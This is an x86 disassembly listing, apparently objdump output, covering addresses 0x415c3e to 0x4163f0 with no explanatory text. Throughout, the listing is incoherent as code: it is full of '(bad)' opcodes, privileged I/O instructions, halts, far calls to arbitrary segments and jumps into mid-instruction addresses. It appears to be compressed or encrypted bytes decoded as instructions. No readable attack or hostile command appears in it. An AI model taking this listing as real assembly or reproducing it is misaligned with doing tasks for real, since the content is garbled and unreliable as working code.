  415c3e:	outs   dx,BYTE PTR ds:[esi]
  415c3f:	pop    edx
  415c40:	push   es
  415c41:	sub    al,0x76
  415c43:	xchg   ecx,eax
  415c44:	pushf  
  415c45:	xor    DWORD PTR [ebx-0x613a15f2],0xffffffd0
  415c4c:	push   esp
  415c4d:	hlt    
  415c4e:	mov    edx,0x462d1b6f
  415c53:	xchg   esp,eax
  415c54:	daa    
  415c55:	cmp    BYTE PTR [ebx+0x4f],bh
  415c58:	ficom  DWORD PTR [ecx]
  415c5a:	xchg   esp,eax
  415c5b:	in     eax,dx
  415c5c:	out    0xeb,al
  415c5e:	rcl    DWORD PTR [esi+0x18b6bc38],cl
  415c64:	cmp    eax,0x35397c9f
  415c69:	push   ebp
  415c6a:	call   0xa197:0x973504c2
  415c71:	lock js 0x415cde
  415c74:	cli    
  415c75:	pushf  
  415c76:	and    eax,0xc6193e83
  415c7b:	ret    0xefff
  415c7e:	push   ss
  415c7f:	and    edx,DWORD PTR [eax+ebx*8]
  415c82:	cmp    eax,0x9dbcae3d
  415c87:	into   
  415c88:	jbe    0x415c8a
  415c8a:	aaa    
  415c8b:	add    dl,0x59
  415c8e:	fwait
  415c8f:	scas   al,BYTE PTR es:[edi]
  415c90:	or     bh,bl
  415c92:	sti    
  415c93:	inc    esi
  415c94:	mov    edi,0x2b56b5a8
  415c99:	mov    ebp,0x69dcb984
  415c9e:	icebp  
  415c9f:	(bad)  
  415ca0:	aas    
  415ca1:	dec    esp
  415ca2:	push   esi
  415ca3:	or     esi,ebx
  415ca5:	inc    ebp
  415ca6:	out    0x56,al
  415ca8:	lea    esp,[ebx-0x3dc736c2]
  415cae:	jne    0x415ce0
  415cb0:	into   
  415cb1:	or     al,0xdc
  415cb3:	pop    esi
  415cb4:	adc    eax,0xb285e8c8
  415cb9:	push   esi
  415cba:	adc    BYTE PTR [ebp+0x70],ah
  415cbd:	or     al,0x26
  415cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc0:	(bad)  
  415cc1:	or     DWORD PTR [ecx+0x7e],ecx
  415cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc5:	ficom  DWORD PTR [eax+0x57]
  415cc8:	push   ecx
  415cc9:	call   0xaee6e482
  415cce:	ja     0x415c63
  415cd0:	out    0x9c,eax
  415cd2:	repnz fldenv [eax-0x5767ebd]
  415cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cda:	lea    esp,[ecx+0x4c]
  415cdd:	adc    al,0x49
  415cdf:	pop    ebx
  415ce0:	adc    BYTE PTR [edi],ah
  415ce2:	inc    edx
  415ce3:	jno    0x415c78
  415ce5:	fstp   TBYTE PTR [edi-0x522edba6]
  415ceb:	sub    bl,BYTE PTR [esi]
  415ced:	in     al,0x0
  415cef:	scas   eax,DWORD PTR es:[edi]
  415cf0:	stos   BYTE PTR es:[edi],al
  415cf1:	out    0xf7,al
  415cf3:	cmp    al,0x32
  415cf5:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  415cf7:	push   edi
  415cf8:	or     eax,DWORD PTR [edx]
  415cfa:	mov    ds:0xa4f77292,al
  415cff:	push   cs
  415d00:	push   ds
  415d01:	sbb    al,0xad
  415d03:	add    BYTE PTR [edi-0x2f],0x20
  415d07:	scas   eax,DWORD PTR es:[edi]
  415d08:	and    DWORD PTR [esi+0x3a7eb528],0xffffffc4
  415d0f:	das    
  415d10:	sub    ecx,DWORD PTR [ebx-0x58]
  415d13:	out    dx,al
  415d14:	pop    ecx
  415d15:	cs sub esi,ebp
  415d18:	dec    ecx
  415d19:	outs   dx,DWORD PTR ds:[esi]
  415d1a:	sbb    DWORD PTR [ebx],ebp
  415d1c:	nop
  415d1d:	xchg   edi,eax
  415d1e:	je     0x415d18
  415d20:	mov    ebp,0x2cff1efc
  415d25:	add    DWORD PTR [esi+ecx*4+0x5c],0x49
  415d2a:	inc    esi
  415d2b:	inc    edi
  415d2c:	call   0xa55f7db0
  415d31:	mov    edi,0x1493e60a
  415d36:	aaa    
  415d37:	cmp    cl,BYTE PTR [ecx+0x540044cd]
  415d3d:	sub    edi,edx
  415d3f:	dec    esi
  415d40:	or     DWORD PTR [edx-0x14],ecx
  415d43:	retf   0x2d53
  415d46:	xlat   BYTE PTR ds:[ebx]
  415d47:	ret    
  415d48:	sbb    al,0xc4
  415d4a:	sbb    eax,0xec577e5f
  415d4f:	les    ecx,FWORD PTR [eax]
  415d51:	sub    eax,0x1c27ec7d
  415d56:	jbe    0x415cff
  415d58:	jge    0x415dd5
  415d5a:	xchg   esi,eax
  415d5b:	ds adc edx,edx
  415d5e:	xlat   BYTE PTR ds:[ebx]
  415d5f:	mov    esi,0x32736ec0
  415d64:	jg     0x415db2
  415d66:	dec    eax
  415d67:	dec    ebp
  415d68:	sbb    eax,0xefad0ca2
  415d6d:	ret    
  415d6e:	and    BYTE PTR [eax+0x5a01fb0],dl
  415d74:	aaa    
  415d75:	out    dx,eax
  415d76:	push   eax
  415d77:	mov    esp,ebp
  415d79:	std    
  415d7a:	cmp    bh,BYTE PTR [ebx+edx*2-0x62c9862d]
  415d81:	mov    bl,0xeb
  415d83:	data16 ds addr16 xor dl,ch
  415d88:	or     DWORD PTR [ebx],ebx
  415d8a:	mov    ebx,0xebbeca23
  415d8f:	adc    BYTE PTR [ebx-0x5e8fdeb0],bl
  415d95:	ret    
  415d96:	ret    0xd1c9
  415d99:	shl    DWORD PTR [esi-0x11f09f4e],0x74
  415da0:	xor    ch,BYTE PTR [edx+0x26d6dd49]
  415da6:	mov    dh,0x2
  415da8:	scas   eax,DWORD PTR es:[edi]
  415da9:	test   al,0x82
  415dab:	test   al,0xb1
  415dad:	aam    0xb1
  415daf:	sub    edx,eax
  415db1:	fist   WORD PTR [edx-0x70]
  415db4:	mov    edi,0x686aa294
  415db9:	test   eax,0xc0135498
  415dbe:	aas    
  415dbf:	sbb    eax,0x3477d1dd
  415dc4:	fld    DWORD PTR [eax]
  415dc6:	loop   0x415da4
  415dc8:	or     DWORD PTR [ebx-0x59],edi
  415dcb:	mov    bh,0xd4
  415dcd:	cld    
  415dce:	pop    ss
  415dcf:	out    dx,eax
  415dd0:	(bad)  
  415dd1:	mov    ds:0x4b5cf2ea,al
  415dd6:	adc    ah,bh
  415dd8:	jns    0x415d5f
  415dda:	cmp    al,BYTE PTR [eax+0x42c8834e]
  415de0:	lock dec ebx
  415de2:	iret   
  415de3:	sub    BYTE PTR [ecx+ecx*2+0x39],dl
  415de7:	(bad)  
  415de9:	sub    DWORD PTR [esi-0x5180a680],edx
  415def:	shl    BYTE PTR [edi],cl
  415df1:	test   eax,0x3d7a0099
  415df6:	mov    BYTE PTR [edi],bh
  415df8:	inc    ebx
  415df9:	xchg   edi,eax
  415dfa:	xor    eax,0x537c0bd1
  415dff:	into   
  415e00:	pop    esp
  415e01:	pop    esp
  415e02:	and    BYTE PTR [ecx+0x160fbad0],bh
  415e08:	call   0x9190e28e
  415e0d:	popa   
  415e0e:	lods   eax,DWORD PTR ds:[esi]
  415e0f:	outs   dx,BYTE PTR ds:[esi]
  415e10:	icebp  
  415e11:	mov    eax,ds:0xab536bd8
  415e16:	jge    0x415e03
  415e18:	stc    
  415e19:	mov    ss,WORD PTR [ebp-0x3f01a544]
  415e1f:	mov    cl,0x90
  415e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e22:	cvtpi2ps xmm5,mm4
  415e25:	sub    BYTE PTR [esi+edx*4],bh
  415e28:	mov    esp,0x49e0abe9
  415e2d:	(bad)
  415e32:	mov    WORD PTR [ebx-0x3e],cs
  415e35:	cmp    DWORD PTR [edi],edx
  415e37:	cld    
  415e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e39:	out    dx,al
  415e3a:	mov    ah,BYTE PTR [edi]
  415e3c:	pop    eax
  415e3d:	cli    
  415e3e:	outs   dx,DWORD PTR ds:[esi]
  415e3f:	cli    
  415e40:	and    DWORD PTR [ebx+0x69],eax
  415e43:	pop    ss
  415e44:	adc    bh,BYTE PTR [esi+0xfc16bea]
  415e4a:	xchg   ebp,eax
  415e4b:	loop   0x415e34
  415e4d:	pop    ss
  415e4e:	mov    bl,0x73
  415e50:	pop    esi
  415e51:	dec    ecx
  415e52:	dec    esp
  415e53:	rcr    DWORD PTR [ebx+eiz*1+0x3700e7f2],cl
  415e5a:	inc    edi
  415e5b:	fistp  DWORD PTR [ebp-0x23]
  415e5e:	pop    ebp
  415e5f:	stos   BYTE PTR es:[edi],al
  415e60:	popa   
  415e61:	inc    edi
  415e62:	(bad)  
  415e63:	push   ebx
  415e64:	(bad)  
  415e65:	push   ebx
  415e66:	cmp    esp,ebx
  415e68:	or     bh,BYTE PTR [edi+ebp*4]
  415e6b:	xor    al,0xcf
  415e6d:	adc    esi,eax
  415e6f:	inc    esp
  415e70:	mov    ch,0x47
  415e72:	xchg   esi,eax
  415e73:	aad    0x4e
  415e75:	gs fdivr st,st(6)
  415e78:	fst    QWORD PTR [ebx-0x9]
  415e7b:	stos   BYTE PTR es:[edi],al
  415e7c:	adc    BYTE PTR [edx+0x42],bh
  415e7f:	inc    esp
  415e80:	add    dh,BYTE PTR [eax+0x6706ad6e]
  415e86:	mov    BYTE PTR [ebx+0x32],bh
  415e89:	jp     0x415e42
  415e8b:	xor    esp,edi
  415e8d:	dec    ebp
  415e8e:	sahf   
  415e8f:	sahf   
  415e90:	in     al,dx
  415e91:	sub    edi,eax
  415e93:	jl     0x415ebc
  415e95:	dec    ebx
  415e96:	imul   edi,DWORD PTR [edi+0x70],0x22
  415e9a:	dec    ecx
  415e9b:	pushf  
  415e9c:	stc    
  415e9d:	lea    ecx,[eax]
  415e9f:	mov    bl,BYTE PTR ds:0x74bbf5a9
  415ea5:	cmp    BYTE PTR [edi],ch
  415ea7:	sbb    ebx,esp
  415ea9:	scas   eax,DWORD PTR es:[edi]
  415eaa:	out    0xe7,al
  415eac:	clc    
  415ead:	jns    0x415e90
  415eaf:	xchg   edi,eax
  415eb0:	mov    bh,0x9c
  415eb2:	out    0x8a,eax
  415eb4:	pusha  
  415eb5:	xchg   edi,eax
  415eb6:	fidiv  WORD PTR [esi+0x4]
  415eb9:	dec    ebp
  415eba:	mov    ebx,0xee542ff1
  415ebf:	aaa    
  415ec0:	mov    al,BYTE PTR ds:0x1ce2d12e
  415ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec7:	out    0x1e,eax
  415ec9:	int    0x3
  415ecb:	in     al,0xb0
  415ecd:	inc    ebx
  415ece:	dec    esi
  415ecf:	xor    ecx,ebp
  415ed1:	dec    edx
  415ed2:	inc    esi
  415ed3:	scas   al,BYTE PTR es:[edi]
  415ed4:	test   DWORD PTR [eax+ecx*4-0x29530d87],ebp
  415edb:	fist   WORD PTR [edx-0x17]
  415ede:	jo     0x415e7e
  415ee0:	pop    ds
  415ee1:	pop    ds
  415ee2:	cld    
  415ee3:	jle    0x415e93
  415ee5:	cmc    
  415ee6:	je     0x415f1d
  415ee8:	lods   eax,DWORD PTR ds:[esi]
  415ee9:	mov    ebx,0xd67d537e
  415eee:	cli    
  415eef:	faddp  st(0),st
  415ef1:	fisubr WORD PTR [edx+0x19]
  415ef4:	mov    al,ds:0x3a0a0509
  415ef9:	retf   
  415efa:	cmp    ah,BYTE PTR [ebp-0x3fd3bf74]
  415f00:	xor    BYTE PTR [edx+0x64],ah
  415f03:	xor    eax,0x2356719
  415f08:	sbb    eax,0xba11459a
  415f0d:	sar    DWORD PTR [edi],0x6c
  415f10:	sub    BYTE PTR [eax-0x47],cl
  415f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f14:	xlat   BYTE PTR ds:[ebx]
  415f15:	loop   0x415eaf
  415f17:	and    cl,BYTE PTR [eax+0x4e7128e8]
  415f1d:	loope  0x415f80
  415f1f:	pop    ds
  415f20:	js     0x415f66
  415f22:	test   BYTE PTR [ebx-0x28],ch
  415f25:	nop
  415f26:	jnp    0x415ef7
  415f28:	dec    ebx
  415f29:	mov    ah,0x58
  415f2b:	out    dx,eax
  415f2c:	int    0xdc
  415f2e:	jno    0x415faf
  415f30:	popa   
  415f31:	jno    0x415efa
  415f33:	sub    edi,DWORD PTR [ebx+0x195c9da5]
  415f39:	push   esi
  415f3a:	emms   
  415f3c:	mov    esp,0xae7f80a8
  415f41:	xchg   edx,eax
  415f42:	test   al,0xbf
  415f44:	fidivr DWORD PTR [edx]
  415f46:	jo     0x415f59
  415f48:	dec    esi
  415f49:	xchg   edi,eax
  415f4a:	rcl    DWORD PTR [edi],0xac
  415f4d:	sub    BYTE PTR [ebp-0x424fbfbd],dl
  415f53:	push   edx
  415f54:	hlt    
  415f55:	test   al,0x54
  415f57:	data16 aam 0x85
  415f5a:	mov    ecx,0x570f3f0c
  415f5f:	mov    al,0x88
  415f61:	adc    al,ch
  415f63:	and    eax,0x9a7a6acc
  415f68:	repz mov esp,0xcb59c2a2
  415f6e:	push   ds
  415f6f:	arpl   WORD PTR [ecx+0x1],cx
  415f72:	adc    al,dh
  415f74:	mov    edx,0x8b01b1d0
  415f79:	(bad)  
  415f7a:	add    DWORD PTR [edx+0x3e8edcf2],esp
  415f80:	int3   
  415f81:	pop    edi
  415f82:	out    0x47,al
  415f84:	add    al,0xb7
  415f86:	sbb    eax,0x52cf3207
  415f8b:	pop    edi
  415f8c:	mov    dh,0x6c
  415f8e:	jg     0x415f6f
  415f90:	sub    BYTE PTR [eax],ch
  415f92:	adc    bl,BYTE PTR ds:0xb9f321b9
  415f98:	retf   0x189f
  415f9b:	fdivr  st,st(2)
  415f9d:	adc    BYTE PTR [ebx],0x92
  415fa0:	pop    esp
  415fa1:	xchg   edi,eax
  415fa2:	or     BYTE PTR [eax-0x7c],dh
  415fa5:	cmp    DWORD PTR ds:0x3a43004b,ebp
  415fab:	push   ebx
  415fac:	shl    DWORD PTR [ebp-0x48],cl
  415faf:	(bad)  
  415fb0:	mov    dl,0x80
  415fb2:	mov    BYTE PTR [eax],cl
  415fb4:	sbb    ebp,ebx
  415fb6:	mov    ebp,0xdf195b55
  415fbb:	sub    al,0xf6
  415fbd:	cmp    eax,0x3fb1dd89
  415fc2:	push   edi
  415fc3:	dec    ecx
  415fc4:	iret   
  415fc5:	rol    DWORD PTR [esi+ebp*4-0x75],0x42
  415fca:	mov    ebp,ebp
  415fcc:	sbb    ah,BYTE PTR [edi]
  415fce:	xchg   edi,eax
  415fcf:	xor    dh,BYTE PTR [ebx+0x6b]
  415fd2:	mov    ah,0x4c
  415fd4:	add    al,BYTE PTR [eax+0x4e9447f2]
  415fda:	cld    
  415fdb:	pop    eax
  415fdc:	sub    esi,ebp
  415fde:	mov    BYTE PTR [eax-0x15],dl
  415fe1:	xlat   BYTE PTR ds:[ebx]
  415fe2:	test   al,0x5e
  415fe4:	xor    edi,DWORD PTR [ecx]
  415fe6:	cld    
  415fe7:	mov    BYTE PTR [ebx],cl
  415fe9:	jmp    0xc486:0xe8886245
  415ff0:	adc    al,0x8b
  415ff2:	leave  
  415ff3:	ins    DWORD PTR es:[edi],dx
  415ff4:	inc    ecx
  415ff5:	repnz pop esp
  415ff7:	push   ebx
  415ff8:	mov    ds:0x5c3039a2,al
  415ffd:	dec    esp
  415ffe:	mov    ds:0x37f1f83c,al
  416003:	lds    esp,FWORD PTR [ebp-0x5253f8ed]
  416009:	mov    al,ds:0xf525a001
  41600e:	cli    
  41600f:	or     BYTE PTR [eax],dh
  416011:	dec    ebx
  416012:	xor    DWORD PTR [esp+ecx*8],ecx
  416015:	jb     0x416011
  416017:	xchg   DWORD PTR [esi],ebx
  416019:	push   0x7c247872
  41601e:	popa   
  41601f:	cli    
  416020:	mov    ebp,0x8d488c02
  416025:	icebp  
  416026:	test   BYTE PTR ds:0x1a40e2c8,ah
  41602c:	in     al,0x7d
  41602e:	cmp    al,0xdb
  416030:	mov    eax,ds:0xa567b946
  416035:	pop    esi
  416036:	xor    BYTE PTR [edx-0x648b5eda],dl
  41603c:	and    al,0x45
  41603e:	iret   
  41603f:	imul   ecx,ebx,0xf01a3fff
  416045:	test   ebp,ebp
  416047:	int    0x44
  416049:	fs inc esp
  41604c:	cmp    eax,0x6fa8c74f
  416051:	fdiv   DWORD PTR [esp+eiz*4-0x4c]
  416055:	inc    ecx
  416056:	inc    edi
  416057:	add    al,0x75
  416059:	jge    0x416010
  41605b:	hlt    
  41605c:	fist   WORD PTR [esi]
  41605e:	inc    esp
  41605f:	push   ebp
  416060:	ror    BYTE PTR [edx-0x716ec1af],0xb3
  416067:	sub    eax,0x1a46db25
  41606c:	inc    esp
  41606d:	sub    bl,BYTE PTR [esi-0x4a]
  416070:	js     0x416053
  416072:	add    al,0x63
  416074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416075:	loop   0x4160ae
  416077:	or     BYTE PTR [ecx],al
  416079:	bound  ebx,QWORD PTR [eax]
  41607b:	add    bl,0xc1
  41607e:	rcr    BYTE PTR [ebp-0x3ee8fd1b],1
  416084:	dec    esp
  416085:	and    ecx,edi
  416087:	enter  0xa06d,0xd3
  41608b:	pop    ebp
  41608c:	adc    eax,0xb66f6e1f
  416091:	mov    eax,ds:0x51bd7694
  416096:	mov    eax,0xd3b1e830
  41609b:	lds    edi,FWORD PTR [edx-0x12eef9bd]
  4160a1:	(bad)  
  4160a2:	stc    
  4160a3:	mov    al,0x37
  4160a5:	pop    ebp
  4160a6:	jge    0x4160ae
  4160a8:	out    0xc4,al
  4160aa:	inc    esp
  4160ab:	jno    0x416104
  4160ad:	cld    
  4160ae:	ds retf 0x712b
  4160b2:	xor    al,0x54
  4160b4:	out    0xd9,al
  4160b6:	and    esp,DWORD PTR [eax+0x71b3662c]
  4160bc:	jo     0x4160b6
  4160be:	xchg   ebx,eax
  4160bf:	mov    esp,0xf0d4959c
  4160c4:	ins    WORD PTR es:[edi],dx
  4160c6:	into   
  4160c7:	pop    edi
  4160c8:	push   esi
  4160c9:	not    ebp
  4160cb:	in     eax,dx
  4160cc:	sar    DWORD PTR [bx+0x6f],cl
  4160d0:	aaa    
  4160d1:	mov    ebp,DWORD PTR [eax-0x7b2a1436]
  4160d7:	stos   DWORD PTR es:[edi],eax
  4160d8:	frstor [ecx+0x1f]
  4160db:	xchg   ecx,eax
  4160dc:	xchg   esp,eax
  4160dd:	test   al,0x47
  4160df:	(bad)  
  4160e1:	jne    0x4160f7
  4160e3:	test   eax,0x4fb13ac9
  4160e8:	sahf   
  4160e9:	mov    edi,0x926d90d9
  4160ee:	jecxz  0x41607f
  4160f0:	cwde   
  4160f1:	mov    esi,0x20fb3d3c
  4160f6:	mov    edx,0xc91eff6e
  4160fb:	jg     0x4160c1
  4160fd:	imul   ecx,edx,0xf01b35e8
  416103:	cmp    DWORD PTR [edx-0x12],ecx
  416106:	leave  
  416107:	cmc    
  416108:	sahf   
  416109:	mov    bl,0x5
  41610b:	mov    al,ds:0x3b9cfc0e
  416110:	test   eax,0x6768a8f9
  416115:	add    eax,0xe7b0f022
  41611a:	jp     0x41611c
  41611c:	lock sbb al,0xb5
  41611f:	mov    cl,BYTE PTR [ecx-0x15cb3297]
  416125:	jo     0x416116
  416127:	sub    bl,bh
  416129:	jg     0x4160d9
  41612b:	pop    edx
  41612c:	jge    0x416158
  41612e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41612f:	(bad)  
  416130:	xor    BYTE PTR [esi],ah
  416132:	adc    al,0x4e
  416134:	(bad)  {z}
  416139:	mov    ds:0x24c59325,al
  41613e:	jmp    0x4161a4
  416140:	or     BYTE PTR [edi+ecx*2+0x29],cl
  416144:	push   esp
  416145:	pop    ecx
  416146:	mov    al,ds:0xdf1eaeab
  41614b:	pop    ecx
  41614c:	call   0x1baa:0xfce2f0ec
  416153:	and    eax,0x1aa9e9a2
  416158:	mov    edx,eax
  41615a:	outs   dx,BYTE PTR ds:[esi]
  41615b:	push   ebx
  41615c:	add    eax,0x8c6154ce
  416161:	test   eax,0xc1162ad9
  416166:	test   BYTE PTR [ebp+0xa7fcf58],0xa6
  41616d:	out    dx,al
  41616e:	out    dx,al
  41616f:	adc    al,0x93
  416171:	fwait
  416172:	adc    eax,0x38d770ed
  416177:	push   es
  416178:	jmp    0x31446c34
  41617d:	out    0xc3,eax
  41617f:	es or  eax,0xf51f72ed
  416185:	jmp    0x63a5:0x882d4a30
  41618c:	dec    ebx
  41618d:	dec    edi
  41618e:	push   edi
  41618f:	clc    
  416190:	jb     0x416208
  416192:	leave  
  416193:	addr16 pop ecx
  416195:	xlat   BYTE PTR ds:[ebx]
  416196:	sbb    BYTE PTR [eax+edi*2],0xc2
  41619a:	test   al,0x38
  41619c:	fsubr  DWORD PTR [ecx]
  41619e:	jns    0x4161f4
  4161a0:	sbb    al,0x42
  4161a2:	add    DWORD PTR [eax-0x72],ecx
  4161a5:	xchg   ecx,eax
  4161a6:	rcl    DWORD PTR [esi+0x24],0x78
  4161aa:	shl    al,cl
  4161ac:	out    0xc3,eax
  4161ae:	mov    ch,BYTE PTR ds:0x717e3835
  4161b4:	push   es
  4161b5:	in     eax,0x33
  4161b7:	ds jmp 0xc58:0x1cfe0c1f
  4161bf:	in     eax,dx
  4161c0:	in     al,dx
  4161c1:	push   ss
  4161c2:	inc    edx
  4161c3:	dec    edx
  4161c4:	mov    ebp,0xe663b632
  4161c9:	mov    ch,0xef
  4161cb:	fmul   DWORD PTR [eax+ecx*1+0x32]
  4161cf:	fmul   DWORD PTR [edi+0x23]
  4161d2:	loop   0x416246
  4161d4:	int    0x9c
  4161d6:	scas   eax,DWORD PTR es:[edi]
  4161d7:	push   edx
  4161d8:	pop    eax
  4161d9:	test   eax,0xb415c467
  4161de:	pop    esi
  4161df:	inc    ebx
  4161e0:	daa    
  4161e1:	sub    BYTE PTR [eax-0x28a3aa37],ah
  4161e7:	in     eax,dx
  4161e8:	mov    esp,0x7ffff6bd
  4161ed:	inc    ebp
  4161ee:	call   0x7178:0xf1b3b1f1
  4161f5:	push   edi
  4161f6:	lods   eax,DWORD PTR ds:[esi]
  4161f7:	ins    DWORD PTR es:[edi],dx
  4161f8:	pop    edx
  4161f9:	cli    
  4161fa:	mov    bl,0x9a
  4161fc:	stos   DWORD PTR es:[edi],eax
  4161fd:	mov    eax,0xca424535
  416202:	and    ch,BYTE PTR [eax+0x43]
  416205:	inc    esi
  416206:	pop    ss
  416207:	ret    0xf929
  41620a:	bound  esp,QWORD PTR [edx+0x35]
  41620d:	test   eax,0x7ccef501
  416212:	push   ebp
  416213:	push   ebx
  416214:	add    al,0x64
  416216:	cmp    DWORD PTR [ebp+eiz*4+0x66da91e1],esp
  41621d:	xor    BYTE PTR [edi+0x50],bl
  416220:	mov    bh,0x64
  416222:	push   ds
  416223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416224:	sbb    al,0x82
  416226:	retf   0x798a
  416229:	rcl    ecx,cl
  41622b:	mov    esp,0x38c024b0
  416230:	int3   
  416231:	ds push esi
  416233:	pop    es
  416234:	and    al,0xf6
  416236:	aaa    
  416237:	pop    esp
  416238:	in     eax,0x6e
  41623a:	int    0x44
  41623c:	and    DWORD PTR [ecx+0x6d],0x3fcc5275
  416243:	jecxz  0x4162ab
  416245:	sbb    al,0x73
  416247:	mov    esi,0xc094555b
  41624c:	std    
  41624d:	inc    ebp
  41624e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41624f:	nop
  416250:	lea    ebx,[edi-0x7ff93131]
  416256:	(bad)  
  416257:	mov    ?,WORD PTR [ecx]
  416259:	dec    edx
  41625a:	pop    ds
  41625b:	jns    0x41625a
  41625d:	frstor [ecx-0x48]
  416260:	inc    eax
  416261:	xchg   esi,eax
  416262:	mov    BYTE PTR [esi],dl
  416264:	push   0x3c
  416266:	sbb    al,0x59
  416268:	cmp    esi,DWORD PTR [esi+0x6e]
  41626b:	cld    
  41626c:	in     al,dx
  41626d:	xchg   edi,eax
  41626e:	jbe    0x416205
  416270:	jge    0x41627a
  416272:	push   ebp
  416273:	call   0x9091:0xcd41c600
  41627a:	pushf  
  41627b:	and    BYTE PTR [esi],dl
  41627d:	mov    bh,0x95
  41627f:	pushf  
  416280:	and    eax,esi
  416282:	adc    ecx,edi
  416284:	lods   eax,DWORD PTR ds:[esi]
  416285:	out    dx,al
  416286:	xchg   dl,al
  416288:	mov    dh,0x3f
  41628a:	jmp    0x416222
  41628c:	sbb    eax,0xe72d44b6
  416291:	fsubrp st(3),st
  416293:	stc    
  416294:	mov    ebp,0x5e3cfd08
  416299:	mov    cl,0xcb
  41629b:	icebp  
  41629c:	out    dx,eax
  41629d:	retf   
  41629e:	cli    
  41629f:	test   DWORD PTR [esi],edx
  4162a1:	int3   
  4162a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162a3:	test   DWORD PTR [ebx-0x72],ecx
  4162a6:	xor    eax,0xe3e6d82e
  4162ab:	mov    bh,0x3b
  4162ad:	stos   BYTE PTR es:[edi],al
  4162ae:	shr    DWORD PTR [edx],1
  4162b0:	bound  eax,QWORD PTR [eax-0x7d]
  4162b3:	ss scas al,BYTE PTR es:[edi]
  4162b5:	dec    eax
  4162b6:	jle    0x4162f7
  4162b8:	mov    DWORD PTR [esp],ecx
  4162bb:	jne    0x41630c
  4162bd:	stos   BYTE PTR es:[edi],al
  4162be:	test   DWORD PTR [edx+0x292d498a],esi
  4162c4:	push   eax
  4162c5:	xor    DWORD PTR [ecx+0x68],0x6
  4162c9:	cld    
  4162ca:	dec    edi
  4162cb:	jecxz  0x41629b
  4162cd:	or     DWORD PTR [esi-0xa5f6e54],esi
  4162d3:	pop    ebp
  4162d4:	cmp    ecx,edx
  4162d6:	cwde   
  4162d7:	test   edi,esp
  4162d9:	adc    DWORD PTR [eax+0x21],ebx
  4162dc:	imul   ebx,ebp,0x14
  4162df:	aaa    
  4162e0:	iret   
  4162e1:	shr    ch,0x2
  4162e4:	mov    al,0x72
  4162e6:	or     al,BYTE PTR [ebp*4-0x2e65fad0]
  4162ed:	hlt    
  4162ee:	push   ds
  4162ef:	std    
  4162f0:	adc    eax,esp
  4162f2:	fidiv  DWORD PTR [eax+ebx*1+0x3a3086d5]
  4162f9:	and    ecx,edi
  4162fb:	in     eax,0x96
  4162fd:	and    al,0x3
  4162ff:	icebp  
  416300:	cmp    BYTE PTR [ebx-0x36d38e6f],ah
  416306:	mov    esp,0x18922462
  41630b:	jp     0x416329
  41630d:	js     0x4162d3
  41630f:	sub    ecx,DWORD PTR [ebp-0x75]
  416312:	ss nop
  416314:	xor    DWORD PTR [esi+ebp*1],ebp
  416317:	rcl    BYTE PTR [edx-0x1099143],0x15
  41631e:	adc    DWORD PTR [edi+0x2ac0f8d9],ecx
  416324:	mov    ebx,0x9a5bfcbc
  416329:	adc    DWORD PTR [ebp-0x3b3996d2],0xffffff83
  416330:	mov    ds:0xb1622975,al
  416335:	xor    ch,BYTE PTR [edx+0x10ec8f14]
  41633b:	jnp    0xde726b5b
  416341:	(bad)  
  416343:	hlt    
  416344:	jae    0x41633c
  416346:	cmp    bh,BYTE PTR [ebx]
  416348:	jmp    0x62649d64
  41634d:	cmp    DWORD PTR [esp+0xe],0xffffffa3
  416352:	push   ebp
  416353:	xor    ebp,DWORD PTR [edi+0x7b710a09]
  416359:	inc    edi
  41635a:	mov    DWORD PTR es:[ecx],esp
  41635d:	jnp    0x416356
  41635f:	lods   eax,DWORD PTR cs:[esi]
  416361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416362:	xchg   BYTE PTR [edx-0x11],cl
  416365:	test   esp,0xe7d56987
  41636b:	cmp    ch,BYTE PTR [ebp+0x6d]
  41636e:	adc    edx,DWORD PTR [ebp+0x4d65cd03]
  416374:	inc    eax
  416375:	in     al,dx
  416376:	xor    al,0x2d
  416378:	int3   
  416379:	das    
  41637a:	js     0x416344
  41637c:	push   0x9dd76278
  416381:	popf   
  416382:	aad    0x84
  416384:	mov    ds,esp
  416386:	in     eax,dx
  416387:	pop    esi
  416388:	inc    esp
  416389:	cmp    eax,0x74bab234
  41638e:	add    dl,al
  416390:	fidiv  DWORD PTR [edx-0x75]
  416393:	adc    eax,0x71a98b6e
  416398:	hlt    
  416399:	(bad)  
  41639a:	xor    bl,ah
  41639c:	push   esp
  41639d:	pop    es
  41639e:	outs   dx,BYTE PTR ds:[esi]
  41639f:	mov    cl,0x1e
  4163a1:	xchg   ecx,eax
  4163a2:	inc    edi
  4163a3:	adc    al,0x35
  4163a5:	jp     0x4163d3
  4163a7:	push   es
  4163a8:	jbe    0x416355
  4163aa:	inc    eax
  4163ab:	push   ebp
  4163ac:	out    0x6,al
  4163ae:	ja     0x4163ae
  4163b0:	push   esp
  4163b1:	loopne 0x4163c9
  4163b3:	xchg   ecx,eax
  4163b4:	enter  0x2bbc,0xc3
  4163b8:	mov    ebp,0x2af05b2e
  4163bd:	int3   
  4163be:	mov    eax,0x9e8b1d6f
  4163c3:	adc    al,0xd4
  4163c5:	push   0x6f0fd66c
  4163ca:	pop    edi
  4163cb:	out    0xf0,al
  4163cd:	push   ebx
  4163ce:	mov    ?,WORD PTR [ecx-0xc]
  4163d1:	or     eax,0x19c41633
  4163d6:	stos   BYTE PTR es:[edi],al
  4163d7:	mov    edx,0xf9636620
  4163dc:	retf   0x4c42
  4163df:	stos   BYTE PTR es:[edi],al
  4163e0:	ins    BYTE PTR es:[edi],dx
  4163e1:	add    edi,DWORD PTR [ecx]
  4163e3:	mov    ecx,0x923ce821
  4163e8:	adc    al,0xa8
  4163ea:	repnz or al,0x3a
  4163ed:	inc    eax
  4163ee:	cli    
  4163ef:	daa    
  4163f0:	ret    
